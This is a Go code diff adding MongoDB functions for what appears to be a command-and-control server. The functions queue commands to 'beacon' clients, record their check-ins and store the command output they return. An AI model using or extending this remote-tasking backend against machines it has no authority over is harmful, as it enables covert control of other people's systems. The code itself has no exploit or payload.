@@ -4,11 +4,13 @@ import (
 	"context"
 	"fmt"
 	"log"
+	"net/url"
 	"os"
 	"strings"
 	"time"
 
 	"go.mongodb.org/mongo-driver/bson"
+	"go.mongodb.org/mongo-driver/bson/primitive"
 	"go.mongodb.org/mongo-driver/mongo"
 	"go.mongodb.org/mongo-driver/mongo/options"
 )
@@ -79,6 +81,14 @@ func buildMongoURI(env string) string {
 		}
 	}
 
+	if as := getEnvWithDefault("MONGO_AUTH_SOURCE", ""); as != "" {
+		sep := "?"
+		if strings.Contains(uri, "?") {
+			sep = "&"
+		}
+		uri += sep + "authSource=" + url.QueryEscape(as)
+	}
+
 	return uri
 }
 
@@ -110,6 +120,7 @@ func InitMongoDB(env string) {
 	ClientCollection = db.Collection(collectionClients)
 	HeartbeatCollection = db.Collection(collectionHeartbeat)
 	DataCollection = db.Collection(collectionData)
+	initAdminCollections(db)
 	log.Println("Connected to MongoDB!")
 }
 
@@ -162,8 +173,12 @@ func FetchAndClearCommands(clientId string) ([]string, error) {
 		return nil, err
 	}
 
-	// Clear the commands array in MongoDB
-	update := bson.M{"$set": bson.M{"Commands": []string{}}}
+	// Clear the commands array and record check-in time (same write as heartbeat).
+	now := time.Now().UTC()
+	update := bson.M{"$set": bson.M{
+		"Commands":   []string{},
+		"LastSeenAt": now,
+	}}
 	_, err = ClientCollection.UpdateOne(ctx, filter, update)
 	if err != nil {
 		log.Println("Error clearing commands:", err)
@@ -171,6 +186,50 @@ func FetchAndClearCommands(clientId string) ([]string, error) {
 	}
 
 	return result.Commands, nil
+}
+
+// AppendBeaconCommands appends command strings to the client's Commands array (delivered on next heartbeat).
+func AppendBeaconCommands(ctx context.Context, clientID string, commands []string) error {
+	var push []string
+	for _, c := range commands {
+		c = strings.TrimSpace(c)
+		if c != "" {
+			push = append(push, c)
+		}
+	}
+	if len(push) == 0 {
+		return fmt.Errorf("no commands to queue")
+	}
+	ctx, cancel := context.WithTimeout(ctx, 10*time.Second)
+	defer cancel()
+	res, err := ClientCollection.UpdateOne(ctx, bson.M{"ClientId": clientID}, bson.M{
+		"$push": bson.M{"Commands": bson.M{"$each": push}}},
+	)
+	if err != nil {
+		return err
+	}
+	if res.MatchedCount == 0 {
+		return mongo.ErrNoDocuments
+	}
+	return nil
+}
+
+// DeleteBeaconClient removes a row from the clients collection by ClientId.
+func DeleteBeaconClient(ctx context.Context, clientID string) error {
+	ctx, cancel := context.WithTimeout(ctx, 10*time.Second)
+	defer cancel()
+	_, err := ClientCollection.DeleteOne(ctx, bson.M{"ClientId": clientID})
+	return err
+}
+
+// UpdateBeaconLastSeen sets LastSeenAt for a client (e.g. after receiving task output).
+func UpdateBeaconLastSeen(ctx context.Context, clientID string) error {
+	ctx, cancel := context.WithTimeout(ctx, 5*time.Second)
+	defer cancel()
+	_, err := ClientCollection.UpdateOne(ctx, bson.M{"ClientId": clientID}, bson.M{
+		"$set": bson.M{"LastSeenAt": time.Now().UTC()},
+	})
+	return err
 }
 
 func FetchClientData(clientId string) ([]bson.M, error) {
@@ -208,4 +267,49 @@ func StoreClientData(clientUUID, command, output string) error {
 		return err
 	}
 	return nil
+}
+
+// CommandOutputRecord is one row in the data collection (command result from POST /receive/{uuid}).
+type CommandOutputRecord struct {
+	ID        primitive.ObjectID `json:"id" bson:"_id,omitempty"`
+	ClientID  string             `json:"client_id" bson:"ClientId"`
+	Command   string             `json:"command" bson:"Command"`
+	Output    string             `json:"output" bson:"Output"`
+	Timestamp time.Time          `json:"timestamp" bson:"Timestamp"`
+}
+
+// ListCommandOutputForClient returns stored command/output pairs for a beacon, newest first.
+func ListCommandOutputForClient(ctx context.Context, clientID string, limit int64) ([]CommandOutputRecord, error) {
+	if limit < 1 || limit > 500 {
+		limit = 100
+	}
+	ctx, cancel := context.WithTimeout(ctx, 20*time.Second)
+	defer cancel()
+	cur, err := DataCollection.Find(ctx, bson.M{"ClientId": clientID}, options.Find().
+		SetSort(bson.D{{Key: "Timestamp", Value: -1}}).
+		SetLimit(limit))
+	if err != nil {
+		return nil, err
+	}
+	defer cur.Close(ctx)
+	var out []CommandOutputRecord
+	for cur.Next(ctx) {
+		var rec CommandOutputRecord
+		if err := cur.Decode(&rec); err != nil {
+			return nil, err
+		}
+		out = append(out, rec)
+	}
+	return out, cur.Err()
+}
+
+// BeaconClientExists reports whether a clients document exists for ClientId.
+func BeaconClientExists(ctx context.Context, clientID string) (bool, error) {
+	ctx, cancel := context.WithTimeout(ctx, 8*time.Second)
+	defer cancel()
+	n, err := ClientCollection.CountDocuments(ctx, bson.M{"ClientId": clientID})
+	if err != nil {
+		return false, err
+	}
+	return n > 0, nil
 }
